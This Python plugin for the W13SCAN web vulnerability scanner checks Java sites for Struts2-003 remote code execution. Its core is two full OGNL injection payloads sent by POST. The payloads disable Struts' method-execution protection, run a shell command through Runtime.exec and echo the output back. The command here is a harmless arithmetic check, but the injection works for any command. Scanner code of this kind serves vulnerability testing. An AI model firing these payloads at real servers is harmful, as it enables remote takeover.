# coding   :utf-8
# file     : struts2_003.py
# author   : go0p
# time     : 2019/8/18 1:51 PM
# software :PyCharm


import copy
import os
import random
import requests

from W13SCAN.lib.common import prepare_url
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'Struts2-003远程代码执行'
    desc = '''暂未测试'''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        version = self.requests.request_version  # HTTP 0.9/1.0/1.1
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL
        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if self.response.language and self.response.language != "JAVA":
            return

        if method == 'GET':
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            ran_a = random.randint(10000000, 20000000)
            ran_b = random.randint(1000000, 2000000)
            ran_check = ran_a - ran_b
            lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)

            checks = [str(ran_check), '无法初始化设备 PRN', '??????? PRN',
                      'Unable to initialize device PRN']
            payloads = [
                r"(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)&(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&(%27\u0023mycmd\u003d\%27print test\%27%27)(bla)(bla)&(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)&(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))&(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))&(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))&(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))&(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla))",
                r"(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)&(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&(%27\u0023mycmd\u003d\%27" + lin + r"\%27%27)(bla)(bla)&(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)&(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))&(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))&(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))&(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))&(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla))"
            ]
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            for payload in payloads:
                r = requests.post(url, headers=headers, data=payload)
                html1 = r.text
                for check in checks:
                    if check in html1:
                        out.success(url, self.name, playload="{}".format(payload), method="POST", check=check,
                                    raw=r.raw)
                        break
